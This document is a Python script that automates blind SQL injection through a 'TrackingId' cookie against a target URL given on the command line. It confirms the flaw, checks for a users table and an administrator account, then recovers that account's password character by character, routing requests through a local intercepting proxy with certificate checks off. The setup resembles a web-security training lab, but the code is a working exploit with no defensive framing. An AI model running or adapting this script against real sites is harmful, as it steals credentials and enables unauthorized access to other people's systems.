import requests
import sys
from http import cookies
import urllib3



def requestGet(cookie):
	response = requests.get(url, verify=False, proxies=proxy, cookies=cookie)
	return response


def getCookie(sql_command):
	response = requests.get(url)
	for cookie in response.cookies:
		if cookie.name == cookie_name:
			new_cookie_value = response.cookies[cookie_name] + sql_command
			response.cookies.set(cookie_name, None)
			response.cookies.set(cookie_name, new_cookie_value)
			return response.cookies

	
def confirmSql(sql_command_patern, sql_conditions):	
	sql_command = sql_command_patern %(sql_conditions["False"])
	cookie = getCookie(sql_command)
	response = requestGet(cookie)
	if verify_string not in (response.text):
		sql_command = sql_command_patern %(sql_conditions["True"])
		cookie = getCookie(sql_command)
		response = requestGet(cookie)
		if verify_string in (response.text):
			return True
		else:
			return False
	else:
		return False

def sendSql(sql_command_patern):
	cookie = getCookie(sql_command_patern)
	response = requestGet(cookie)
	if verify_string in (response.text):
		return True
	else:
		return False


def getLenght(sql_command_patern,sql_conditions):
	for i in range (0,100):
		sql_command_patern_number = sql_command_patern %(i)
		if sendSql(sql_command_patern_number):
			i = i + 1
		else:
			return i
			break

def getPasswordChar(sql_command_patern):
	#32-126 are ASCII printable set
	for j in range(32, 126):
		sql_command = sql_command_patern.replace("[CHAR]", chr(j))
		if sendSql(sql_command):
			return chr(j)
		else:
			j = j + 1


def main():
	if len(sys.argv) != 2:
		print ("(+) usage: python3 sql_blind_injection.py <target>")
		print ("(+) eg: python3 sql_blind_injection.py https://blabla.target.com")
		sys.exit(-1)																					 
	
	urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
	
	### START Define Global Variables ###
	global url, proxy, cookie_name, verify_string

	proxy = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}
	url = sys.argv[1]
	cookie_name = "TrackingId"
	verify_string = "Welcome back"

	### END Define Global Variables ###


	sql_conditions = {
		"True":"a",
		"False":"b"
		}

	sql_simple = "' AND 'a'='%s"


	sql_table_user_name = "users"
	sql_table_user = "' AND (SELECT 'a' FROM " + sql_table_user_name + " LIMIT 1)='%s"

	sql_column_user_name = "username"
	sql_column_user = "' AND (SELECT 'a' FROM " + sql_table_user_name + " WHERE LENGTH("+ sql_column_user_name + ")>1 LIMIT 1)='%s"

	sql_user_name = "administrator"
	sql_user = "' AND (SELECT 'a' FROM " + sql_table_user_name + " WHERE username='" + sql_user_name + "')='%s"

	sql_column_pass_name = "password"
	sql_column_pass = "' AND (SELECT 'a' FROM " + sql_table_user_name + " WHERE LENGTH("+ sql_column_pass_name + ")>1 LIMIT 1)='%s"

	sql_lenght = "' AND (SELECT 'a' FROM " + sql_table_user_name + " WHERE username='" + sql_user_name + "' AND LENGTH(password)>%s)='a"
	
	sql_password = "' AND (SELECT SUBSTRING("+ sql_column_pass_name +",%s,1) FROM " + sql_table_user_name + " WHERE " + sql_column_user_name + "='" + sql_user_name + "')='[CHAR]"


	#Verify that the "verify_string" message appears in the response. 
	if not confirmSql(sql_simple, sql_conditions):
		print("(-) Blind SQL was NOT confirmed")
		sys.exit(-1)
	else:
		print("(+) Blind SQL was confirmed")

		#Verify that the condition is true, confirming that there is a table called 'sql_table_user_name'
		if not confirmSql(sql_table_user, sql_conditions):
			print("(-) There is no table '%s'" %(sql_table_user_name))
			sys.exit(-1)
		else:
			print("(+) Found table '%s'" %(sql_table_user_name))

			#Verify that the condition is true, confirming that there is a column called 'sql_column_user_name'
			if not confirmSql(sql_column_user, sql_conditions):
				print("(-) There is no column '%s'" %(sql_column_user_name))
				sys.exit(-1)
			else:
				print("(+) Found column '%s'" %(sql_column_user_name))

				#Verify that the condition is true, confirming that there is a user called 'sql_user_name'
				if not confirmSql(sql_user, sql_conditions):
					print("(-) There is no user '%s' in table '%s'" %(sql_user_name, sql_table_user_name))
					sys.exit(-1)
				else:
					print("(+) User '%s' is in table '%s'" %(sql_user_name, sql_table_user_name))
		
					#Verify that the condition is true, confirming that there is a table called 'sql_column_pass_name'
					if not confirmSql(sql_column_pass, sql_conditions):
						print("(-) There is no table '%s'" %(sql_column_pass_name))
						sys.exit(-1)
					else:
						print("(+) Found table '%s'" %(sql_column_pass_name))

						#Determine how many characters are in the password
						print("(+) Determining how many characters are in the password. Wait....")
						password_lenght = str(getLenght(sql_lenght,sql_conditions))
						print("(+) Password is %s characters long" %(password_lenght))

						#Looking for the password
						print ("(+) Looking for the password. Wait...:")
						for i in range(1, int(password_lenght)+1):
							sql_password_char = sql_password %(i)
							password_char = getPasswordChar(sql_password_char)
							sys.stdout.write(password_char)
							sys.stdout.flush()
							i = i + 1
						print ("\n(+) done!")




if __name__ == '__main__':
    main()
